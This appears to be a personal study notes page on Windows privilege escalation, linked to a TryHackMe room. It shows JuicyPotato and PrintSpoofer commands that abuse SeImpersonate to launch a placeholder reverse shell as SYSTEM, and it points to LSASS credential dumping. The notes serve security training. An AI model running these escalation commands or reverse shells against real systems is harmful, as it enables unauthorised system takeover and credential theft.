# Privileges

[![windowsprivesc20](../../../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)

<div class="row row-cols-lg-2"><div>

Users may have privileges for running some system tasks such as backups that may be used to escalate.

You can list your privileges with the command below, **but**, you won't see all of them unless you're in an admin prompt.

```shell!
PS> whoami /priv
```

🔥 You can find [way to exploit them on Priv2Admin](https://github.com/gtworek/Priv2Admin) <small>(1.7k ⭐)</small>.
</div><div>

Privileges are [listed and explained here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).
</div></div>

<hr class="sep-both">

## Privilege2Admin

<div class="row row-cols-lg-2"><div>

You may use these as a normal user to escalate to admin or system, and as admin to escalate to system.

#### SeImpersonate — steal access tokens
 
The most common approach is to use [potato](/cybersecurity/red-team/s4.privesc/windows/tools/potato.md) scripts. 

```ps
PS> # You can pick any port for -l. It's for DCOM traffic. 
PS> .\JuicyPotato.exe -l any_port -p c:\windows\system32\cmd.exe -a "/c <reverse shell command>" -t *
````

You can use [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) <small>(1.7k ⭐, 2020 🪦)</small>:

````ps
PS> .\PrintSpoofer.exe -c "<reverse shell command>"
````

Additional references:

* [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) <small>(0.5k ⭐, 2020 🪦)</small> using [WinRM](/operating-systems/networking/protocols/winrm.md)
* [token-priv](https://github.com/hatRiot/token-priv/tree/master) <small>(0.7k ⭐, 2017 🪦)</small>
</div><div>
</div></div>

<hr class="sep-both">

## Admin2System

<div class="row row-cols-lg-2"><div>

You may use these as an admin to escalate system.

#### SeDebugPrivilege — Dump Process Memory

We can use methods shown in [Dump Credentials From LSASS Process](/operating-systems/windows/security/index.md#dump-credentials-from-lsass-process) to dump a process memory, which is often LSASS.
</div><div>
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [RogueWinRM](/operating-systems/networking/protocols/winrm.md) when `SeImpersonatePrivilege`
</div><div>
</div></div>